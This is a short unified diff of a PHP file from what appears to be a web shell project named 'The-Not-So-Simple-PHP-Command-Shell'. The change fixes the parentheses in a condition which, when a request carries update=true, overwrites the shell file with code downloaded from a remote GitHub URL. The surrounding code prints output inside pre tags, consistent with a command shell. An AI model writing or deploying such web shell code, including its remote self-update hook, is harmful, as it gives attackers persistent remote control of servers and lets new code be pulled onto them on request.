@@ -112,7 +112,7 @@
 			echo '</pre>';
 		}
 
- 		if (isset($_GET['update'])) && $_GET['update'] == "true" {
+ 		if (isset($_GET['update'])&& $_GET['update'] == "true") {
         file_put_contents("nsscmdshell.php", file_get_contents("https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/nsscmdshell.php"));
 }
 		?>
